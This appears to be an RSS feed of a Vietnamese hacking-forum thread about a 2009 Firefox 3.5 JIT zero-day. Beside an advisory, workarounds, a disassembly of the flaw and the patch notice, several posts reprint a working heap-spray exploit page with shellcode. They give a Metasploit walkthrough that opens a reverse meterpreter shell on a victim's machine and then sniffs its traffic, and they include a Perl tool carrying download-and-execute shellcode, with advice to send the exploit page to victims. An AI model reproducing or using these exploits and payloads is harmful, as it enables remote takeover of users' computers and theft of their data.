<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "0-day in Mozilla Firefox 3.5 - critical"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
		<description><![CDATA[Latest messages posted in the topic "0-day in Mozilla Firefox 3.5 - critical"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ Theo <span class="link"> http://www.us-cert.gov/current/index.html#mozilla_firefox_3_5_vulnerability</span>, Javascript engine của FF 3.5 hiện có thể bị khai thác thực thi mã độc khi người sử dụng mở trang web có nhúng mã khai thác. Đoạn mã khai thác đã được phát tán rộng rãi trên internet.

Giải pháp hiện tại: Tắt tính năng Javascript hoặc làm theo hướng dẫn của US-CERT tại <span class="link"> http://www.us-cert.gov/reading_room/securing_browser/#Mozilla_Firefox</span>.

<b>Bổ sung: </b> Có hai biện pháp giải quyết tạm thời
 - Dùng addons NoScript của Firefox hoặc
 - Tắt chức năng JIT của Javascript: trong about:config, đặt [color="red"]<b>javascript.options.jit.content= false</b>[/color]


Sẽ có FF 3.5.1 trong tháng này nhằm vá lỗi của javascript và <span class="link"> http://blog.internetnews.com/skerner/2009/07/firefox-35-at-risk-from-0day-j.html</span> của FF 3.5.
---
<i>Sửa đổi bổ sung phần giải pháp tạm thời</i>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186333</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186333</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 02:19:09]]> GMT</pubDate>
				<author><![CDATA[ mfeng]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ Thank for your news.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186335</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186335</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 03:03:24]]> GMT</pubDate>
				<author><![CDATA[ gadaubac]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ mã khai thác đã có trên milw0rm.com:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Firefox 3.5 Vulnerability&lt;/title&gt;
Firefox 3.5 Heap Spray Vulnerabilty
&lt;/br&gt;
Author: SBerry aka Simon Berry-Byrne
&lt;/br&gt;
Thanks to HD Moore for the insight and Metasploit for the payload
&lt;div id="content"&gt;
&lt;p&gt;
&lt;FONT&gt;                             
&lt;/FONT&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;FONT&gt;Loremipsumdoloregkuw&lt;/FONT&gt;&lt;/p&gt;
&lt;p&gt;
&lt;FONT&gt;Loremipsumdoloregkuwiert&lt;/FONT&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;FONT&gt;Loremikdkw  &lt;/FONT&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;script language=JavaScript&gt;
 
/* Calc.exe */
var shellcode = unescape&#40;"%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800" +   
                       "%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A" +   
                       "%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350" +   
                       "%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40" +   
                       "%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000" +   
                       "%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040" +   
                       "%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD" +   
                       "%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40" +   
                       "%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18" +   
                       "%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0" +   
                       "%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B" +   
                       "%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24" +   
                       "%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9" +   
                       "%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C" +   
                       "%u652E%u6578%u9000"&#41;;
/* Heap Spray code */            
oneblock = unescape&#40;"%u0c0c%u0c0c"&#41;;
var fullblock = oneblock;
while &#40;fullblock.length&lt;0x60000&#41;  
{
    fullblock += fullblock;
}
sprayContainer = new Array&#40;&#41;;
for &#40;i=0; i&lt;600; i++&#41;  
{
    sprayContainer&#91;i&#93; = fullblock + shellcode;
}
var searchArray = new Array&#40;&#41;
 
function escapeData&#40;data&#41;
{
 var i;
 var c;
 var escData='';
 for&#40;i=0;i&lt;data.length;i++&#41;
  {
   c=data.charAt&#40;i&#41;;
   if&#40;c=='&' || c=='?' || c=='=' || c=='%' || c==' '&#41; c = escape&#40;c&#41;;
   escData+=c;
  }
 return escData;
}
 
function DataTranslator&#40;&#41;{
    searchArray = new Array&#40;&#41;;
    searchArray&#91;0&#93; = new Array&#40;&#41;;
    searchArray&#91;0&#93;&#91;"str"&#93; = "blah";
    var newElement = document.getElementById&#40;"content"&#41;
    if &#40;document.getElementsByTagName&#41; {
        var i=0;
        pTags = newElement.getElementsByTagName&#40;"p"&#41;
        if &#40;pTags.length &gt; 0&#41;  
        while &#40;i&lt;pTags.length&#41;
        {
            oTags = pTags&#91;i&#93;.getElementsByTagName&#40;"font"&#41;
            searchArray&#91;i+1&#93; = new Array&#40;&#41;
            if &#40;oTags&#91;0&#93;&#41;  
            {
                searchArray&#91;i+1&#93;&#91;"str"&#93; = oTags&#91;0&#93;.innerHTML;
            }
            i++
        }
    }
}
 
function GenerateHTML&#40;&#41;
{
    var html = "";
    for &#40;i=1;i&lt;searchArray.length;i++&#41;
    {
        html += escapeData&#40;searchArray&#91;i&#93;&#91;"str"&#93;&#41;
    }    
}
DataTranslator&#40;&#41;;
GenerateHTML&#40;&#41;
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;

# milw0rm.com &#91;2009-07-13&#93;</pre>
		</div>

các bác update metasploit  về để hack nhé

video khai thác lỗi:

<span class="link"> http://www.youtube.com/watch?v=G_lNIByYXxE</span>
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186341</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186341</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 09:11:00]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ Sáng suốt khi chưa nâng cấp lên 3.5 :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186350</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186350</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 11:06:21]]> GMT</pubDate>
				<author><![CDATA[ MrTux]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ Bản mới một số addon tự dưng hông xài được mới đau &gt;"&lt;]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186363</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186363</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 13:14:34]]> GMT</pubDate>
				<author><![CDATA[ Bướm Đêm]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ LOL :D ,bên metasploit đã cập nhật modun,link:

<span class="link"> http://trac.metasploit.com/browser/framework3/trunk/modules/exploits/multi/browser/firefox_escape_retval.rb</span>

hướng dẫn add

<span class="link"> http://carnal0wnage.blogspot.com/2008/07/adding-your-own-exploits-in-metasploit.html</span>

hoặc ở đây:

<span class="link"> http://www.hvaonline.net/hvaonline/posts/list/21868.hva</span>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186375</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186375</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 13:53:04]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ Kaspersky vừa mới xử xong em này :D

Cách dùng 0-day này với metasploit (mình dùng reverse_tcp nha):

<blockquote>msf &gt; <b>use exploit/multi/browser/firefox_escape_retval</b>

msf exploit(firefox_escape_retval) &gt; <b>set PAYLOAD windows/meterpreter/reverse_tcp</b>

PAYLOAD =&gt; windows/meterpreter/reverse_tcp
&nbsp;
		</blockquote>

<blockquote>msf exploit(firefox_escape_retval) &gt; <b>show options</b>&nbsp;
		</blockquote>

<blockquote>
Module options:

   Name     Current Setting  Required  Description

   ----     ---------------  --------  -----------

   SRVHOST  0.0.0.0          yes       The local host to listen on.

   SRVPORT  8080             yes       The local port to listen on.

   SSL      false            no        Use SSL

   URIPATH                   no        The URI to use for this exploit (default is random)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description

   ----      ---------------  --------  -----------

   EXITFUNC  thread           yes       Exit technique: seh, thread, process

   LHOST                      yes       The local address

   LPORT     4444             yes       The local port

Exploit target:

   Id  Name

   --  ----

   0   Firefox 3.5.0 on Windows XP SP0-SP3&nbsp;
		</blockquote>

SRVPORT hiện là 8080, thay đổi lại thành 80 cho dễ dùng, và set url Path luôn nha :

<blockquote>msf exploit(firefox_escape_retval) &gt; <b>set SRVPORT 80</b>

SRVPORT =&gt; 80

msf exploit(firefox_escape_retval) &gt; <b>set URIPATH index.html</b>

URIPATH =&gt; index.html&nbsp;
		</blockquote>

Nhớ set lại IP để reverse về nhé :

<blockquote>msf exploit(firefox_escape_retval) &gt; set LHOST 203.162.11.12

LHOST =&gt; 203.162.11.12
&nbsp;
		</blockquote>

Lúc này server sẽ lắng nghe ở port 4444, nếu cần thì thay đổi lại cho phù hợp.

bắt đầu run exploit

<blockquote>msf exploit(firefox_escape_retval) &gt; <b>exploit</b>&nbsp;
		</blockquote>


<blockquote>
[*] Exploit running as background job.

msf exploit(firefox_escape_retval) &gt;

[*] Handler binding to LHOST 0.0.0.0

[*] Started reverse handler

[*] Using url:<span class="link"> http://0.0.0.0:80/index.html</span>

[*]  Local IP:<span class="link"> http://203.162.11.12:80/index.html</span>

[*] Server started.&nbsp;
		</blockquote>

Sau khi victim run address xong, ta có được shell rồi, tiếp theo interaction vào session để có shell

<blockquote>msf exploit(firefox_escape_retval) &gt; <b>sessions -i 1</b>

[*] Starting interaction with 1...

meterpreter &gt; ipconfig&nbsp;
		</blockquote>

.................. làm gì nữa thì tùy nha, tuy nhiên nếu firefox cash hoặc victim đóng  lại thì mất shell, vì thế khi có shell rồi tranh thủ nhanh tay làm cái gì đó thì làm nha :D
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186405</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186405</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 18:52:28]]> GMT</pubDate>
				<author><![CDATA[ hoahongtim]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ vào được rồi thì sử dụng meterpreter để  Sniff

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>meterpreter &gt; help

…….

Sniffer Commands

================

 

    Command             Description

    -------             -----------

    sniffer_dump        Retrieve captured packet data

    sniffer_interfaces  list all remote sniffable interfaces

    sniffer_start       Capture packets on a previously opened interface

    sniffer_stats       View statistics of an active capture

    sniffer_stop        Stop packet captures on the specified interface

meterpreter &gt; sniffer_interfaces

1 - 'VMware Accelerated AMD PCNet Adapter' &#40; type:0 mtu:1514 usable:true dhcp:true wifi:false &#41;

meterpreter &gt;</pre>
		</div>

hoặc biết thêm thông tin gì đó về victim:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>meterpreter &gt; sysinfo

Computer: victim

OS      : Windows XP &#40;Build 2600, Service Pack 2&#41;.

meterpreter &gt;</pre>
		</div>

chúc các bác thành công :D ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186413</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186413</link>
				<pubDate><![CDATA[Wed, 15 Jul 2009 19:15:18]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ Một số phân tích kĩ thuật thêm về bug này:
Lỗi này nằm tại file js3250.dll. Đoạn mã khai thác lỗi cho phép điều khiển giá trị eax và ecx tại đoạn lệnh sau

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>0038695C            83E1 F8                    AND ECX,FFFFFFF8
0038695F            8B11                       MOV EDX,DWORD PTR DS:&#91;ECX&#93;
00386961            8B02                       MOV EAX,DWORD PTR DS:&#91;EDX&#93;  ; &lt;-- EAX bị sửa đổi ở đây
00386963            83C3 FC                    ADD EBX,-4
00386966            53                         PUSH EBX
00386967            6A 00                      PUSH 0
00386969            51                         PUSH ECX
0038696A            8B48 20                    MOV ECX,DWORD PTR DS:&#91;EAX+20&#93; ; &lt;-- Dùng kỹ thuật heap spray để chèn đoạn padding & shellcode vào vùng bộ nhớ eax + 20.
0038696D            57                         PUSH EDI
0038696E            FFD1                       CALL ECX         ; &lt;-- Shellcode được gọi từ đây</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186448</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186448</link>
				<pubDate><![CDATA[Thu, 16 Jul 2009 02:02:30]]> GMT</pubDate>
				<author><![CDATA[ mfeng]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">mfeng wrote:</cite><br>
		<blockquote>Một số phân tích kĩ thuật thêm về bug này:
Lỗi này nằm tại file js3250.dll. Đoạn mã khai thác lỗi cho phép điều khiển giá trị eax và ecx tại đoạn lệnh sau

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>0038695C            83E1 F8                    AND ECX,FFFFFFF8
0038695F            8B11                       MOV EDX,DWORD PTR DS:&#91;ECX&#93;
00386961            8B02                       MOV EAX,DWORD PTR DS:&#91;EDX&#93;  ; &lt;-- EAX bị sửa đổi ở đây
00386963            83C3 FC                    ADD EBX,-4
00386966            53                         PUSH EBX
00386967            6A 00                      PUSH 0
00386969            51                         PUSH ECX
0038696A            8B48 20                    MOV ECX,DWORD PTR DS:&#91;EAX+20&#93; ; &lt;-- Dùng kỹ thuật heap spray để chèn đoạn padding & shellcode vào vùng bộ nhớ eax + 20.
0038696D            57                         PUSH EDI
0038696E            FFD1                      &#91;color=yellow&#93; CALL ECX&#91;/color&#93;         ; &lt;-- Shellcode được gọi từ đây</pre>
		</div>&nbsp;
		</blockquote>
Nó call ECX trực tiếp vậy hèn chi đọc đoạn shellcode của cái code PoC trên milw0rm, mình thấy nó ko thèm encode shellcode gì hết, NULL byte từa lưa
Thanks mfeng]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186487</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186487</link>
				<pubDate><![CDATA[Thu, 16 Jul 2009 12:38:34]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ @gamma:

Heap spray đâu có cần quan tâm null bytes làm gì đâu. ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186499</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186499</link>
				<pubDate><![CDATA[Thu, 16 Jul 2009 13:38:48]]> GMT</pubDate>
				<author><![CDATA[ Thug4Lif3]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ @Thug: uhm, mình chưa xem kĩ, cái title trên milw0rm là remote buffer overflow
_http://milw0rm.com/exploits/9137
:D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186500</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186500</link>
				<pubDate><![CDATA[Thu, 16 Jul 2009 13:54:02]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ Đã có bản vá lỗi Firefox 3.5.1
<blockquote>
Impact key:

    * Critical: Vulnerability can be used to run attacker code and install software, requiring no user interaction beyond normal browsing.
    * High: Vulnerability can be used to gather sensitive data from sites in other windows or inject data or code into those sites, requiring no more than normal browsing actions.
    * Moderate: Vulnerabilities that would otherwise be High or Critical except they only work in uncommon non-default configurations or require the user to perform complicated and/or unlikely steps.
    * Low: Minor security vulnerabilities such as Denial of Service attacks, minor data leaks, or spoofs. (Undetectable spoofs of SSL indicia would have "High" impact because those are generally used to steal sensitive data intended for other sites.) 

Fixed in Firefox 3.5.1
MFSA 2009-41 Corrupt JIT state after deep return from native function
&nbsp;
		</blockquote><span class="link"> http://www.mozilla.org/security/known-vulnerabilities/firefox35.html#firefox3.5.1</span>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186656</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186656</link>
				<pubDate><![CDATA[Fri, 17 Jul 2009 21:53:47]]> GMT</pubDate>
				<author><![CDATA[ jforum3000]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ các bạn sử dụng đoạn mã perl sau để transltae sang  javascript(vẫn sử dụng exploits  HTML):


<font color='orange'># Win32 Download & Execute Shellcode / Translating shellcode To JScript shellcode</font>

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#!/usr/bin/perl

use strict;

# Win32 Download & Execute Shellcode / Translating shellcode To JScript shellcode

# coded by elazer &#40;elazarb &#91;at&#93; earthlink.net&#41;


# linux Usage:
# bt shellcode # ./jscript.pl %uc933%ue983%ud9b8%ud9ee%u2474%u5bf4%u7381%u1713%uc161%u8392%ufceb%uf4e2%u0beb%udf2a%u98ff%u6d3e%u01e8%ufe4a%u4533%ud74a%uea2b%u97bd%u606f%u192e%u7958%ucd4a%u6037%udb2a%u559c%u934a%u50f9%u0b01%ue5bb%ue601%ua010%u9f0b%ua316%u662a%u352c%ubae5%u8462%ucd4a%u6033%uf42a%u6d9c%u198a%u7d48%u79c0%u4d14%u1b4a%u457b%uf3dd%u50d4%uf61a%u229c%u19f1%u6d57%ue24a%ucc0b%ud24a%u3f1f%u1ca9%u6f59%uc22d%ub7e8%uc1a7%u0971%ua0f2%u167f%ua0b2%u3548%u423e%uaa7f%u6e2c%u312c%u443e%ue848%uf424%u8c96%u90c9%u0b42%u6dc3%u09c7%u9b18%ucce2%u6d96%u32c1%uc192%u2244%ud192%u9e44%ufa11%uc9d7%ud1c0%u0971%u3cc9%u3271%u7348%u0982%u6b2d%u01bd%u6d96%u0bc1%uc3d1%u9e42%uf411%u057d%ufaa7%u0c74%uc2ab%u484e%u1b0d%u0bf0%u1b85%u50f5%u6101%uf4bd%u6f48%u23e9%u6cec%u4d55%ue84c%uca2f%u396a%u137f%u213f%u9e01%ubab4%ub7e8%uc59a%u3045%uc390%u607d%uc390%u3042%u423e%ucc7f%u9718%u32d9%u443e%u9e7d%ua53e%ub1e8%u75a9%ua76e%u6db8%u6562%u443e%u16e8%u6d3d%u09c7%u1831%u3e13%u6d92%u9ec1%u9211

# windows Usage:
# C:\Documents and Settings\elazer\Desktop&gt;jscript.pl %uc933%ue983%ud9b8%ud9ee%u2474%u5bf4%u7381%u1713%uc161%u8392%ufceb%uf4e2%u0beb%udf2a%u98ff%u6d3e%u01e8%ufe4a%u4533%ud74a%uea2b%u97bd%u606f%u192e%u7958%ucd4a%u6037%udb2a%u559c%u934a%u50f9%u0b01%ue5bb%ue601%ua010%u9f0b%ua316%u662a%u352c%ubae5%u8462%ucd4a%u6033%uf42a%u6d9c%u198a%u7d48%u79c0%u4d14%u1b4a%u457b%uf3dd%u50d4%uf61a%u229c%u19f1%u6d57%ue24a%ucc0b%ud24a%u3f1f%u1ca9%u6f59%uc22d%ub7e8%uc1a7%u0971%ua0f2%u167f%ua0b2%u3548%u423e%uaa7f%u6e2c%u312c%u443e%ue848%uf424%u8c96%u90c9%u0b42%u6dc3%u09c7%u9b18%ucce2%u6d96%u32c1%uc192%u2244%ud192%u9e44%ufa11%uc9d7%ud1c0%u0971%u3cc9%u3271%u7348%u0982%u6b2d%u01bd%u6d96%u0bc1%uc3d1%u9e42%uf411%u057d%ufaa7%u0c74%uc2ab%u484e%u1b0d%u0bf0%u1b85%u50f5%u6101%uf4bd%u6f48%u23e9%u6cec%u4d55%ue84c%uca2f%u396a%u137f%u213f%u9e01%ubab4%ub7e8%uc59a%u3045%uc390%u607d%uc390%u3042%u423e%ucc7f%u9718%u32d9%u443e%u9e7d%ua53e%ub1e8%u75a9%ua76e%u6db8%u6562%u443e%u16e8%u6d3d%u09c7%u1831%u3e13%u6d92%u9ec1%u9211

# your shellcode here
my $shellcode =
"\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xdf".
"\xfa\xe2\x72\x83\xeb\xfc\xe2\xf4\x23\x90\x09\x3f\x37\x03\x1d\x8d".
"\x20\x9a\x69\x1e\xfb\xde\x69\x37\xe3\x71\x9e\x77\xa7\xfb\x0d\xf9".
"\x90\xe2\x69\x2d\xff\xfb\x09\x3b\x54\xce\x69\x73\x31\xcb\x22\xeb".
"\x73\x7e\x22\x06\xd8\x3b\x28\x7f\xde\x38\x09\x86\xe4\xae\xc6\x5a".
"\xaa\x1f\x69\x2d\xfb\xfb\x09\x14\x54\xf6\xa9\xf9\x80\xe6\xe3\x99".
"\xdc\xd6\x69\xfb\xb3\xde\xfe\x13\x1c\xcb\x39\x16\x54\xb9\xd2\xf9".
"\x9f\xf6\x69\x02\xc3\x57\x69\x32\xd7\xa4\x8a\xfc\x91\xf4\x0e\x22".
"\x20\x2c\x84\x21\xb9\x92\xd1\x40\xb7\x8d\x91\x40\x80\xae\x1d\xa2".
"\xb7\x31\x0f\x8e\xe4\xaa\x1d\xa4\x80\x73\x07\x14\x5e\x17\xea\x70".
"\x8a\x90\xe0\x8d\x0f\x92\x3b\x7b\x2a\x57\xb5\x8d\x09\xa9\xb1\x21".
"\x8c\xb9\xb1\x31\x8c\x05\x32\x1a\x1f\x52\xe0\x17\xb9\x92\xea\x3b".
"\xb9\xa9\x6b\x93\x4a\x92\x0e\x8b\x75\x9a\xb5\x8d\x09\x90\xf2\x23".
"\x8a\x05\x32\x14\xb5\x9e\x84\x1a\xbc\x97\x88\x22\x86\xd3\x2e\xfb".
"\x38\x90\xa6\xfb\x3d\xcb\x22\x81\x75\x6f\x6b\x8f\x21\xb8\xcf\x8c".
"\x9d\xd6\x6f\x08\xe7\x51\x49\xd9\xb7\x88\x1c\xc1\xc9\x05\x97\x5a".
"\x20\x2c\xb9\x25\x8d\xab\xb3\x23\xb5\xfb\xb3\x23\x8a\xab\x1d\xa2".
"\xb7\x57\x3b\x77\x11\xa9\x1d\xa4\xb5\x05\x1d\x45\x20\x2a\x8a\x95".
"\xa6\x3c\x9b\x8d\xaa\xfe\x1d\xa4\x20\x8d\x1e\x8d\x0f\x92\x12\xf8".
"\xdb\xa5\xb1\x8d\x09\x05\x32\x72";





my $jscript =convert_shellcode&#40;$shellcode&#41;;
buffer_gen&#40;$shellcode&#41;;
print $jscript;

sub generate_char&#40;&#41;
{
 my $wdsize = shift;
 my @alphanumeric = &#40;'a'..'z'&#41;;
 my $wd = join '',
 map $alphanumeric&#91;rand @alphanumeric&#93;, 0..$wdsize;
  return $wd;
}

sub convert_shellcode {
        my $data = shift;
        my $mode = shift&#40;&#41; || 'LE';
        my $code = '';

        my $idx = 0;

        if &#40;length&#40;$data&#41; % 2 != 0&#41; {
                $data .= substr&#40;$data, -1, 1&#41;;
        }

        while &#40;$idx &lt; length&#40;$data&#41; - 1&#41; {
                my $c1 = ord&#40;substr&#40;$data, $idx, 1&#41;&#41;;
                my $c2 = ord&#40;substr&#40;$data, $idx+1, 1&#41;&#41;;
                if &#40;$mode eq 'LE'&#41; {
                        $code .= sprintf&#40;'%%u%.2x%.2x', $c2, $c1&#41;;
                } else {
                        $code .= sprintf&#40;'%%u%.2x%.2x', $c1, $c2&#41;;
                }
                $idx += 2;
        }

        return $code;
}

sub buffer_gen&#40;&#41;{

}</pre>
		</div>

sau đó changing  shellcode, upload file .html lên host,rồi send cho victim ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186971</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#186971</link>
				<pubDate><![CDATA[Mon, 20 Jul 2009 19:23:59]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
			<item>
				<title>0-day in Mozilla Firefox 3.5 - critical</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">tientan.infotech wrote:</cite><br>
		<blockquote>Của tui up len 3.5.2 ròi.mà chưa từng thử hack.Có bro nào dạy mình hem nhỉ ?&nbsp;
		</blockquote>

demo:

<span class="link"> http://www.youtube.com/watch?v=G_lNIByYXxE</span>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/30245.hva#188681</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/30245.hva#188681</link>
				<pubDate><![CDATA[Tue, 4 Aug 2009 09:48:58]]> GMT</pubDate>
				<author><![CDATA[ holiganvn]]></author>
			</item>
	</channel>
</rss>
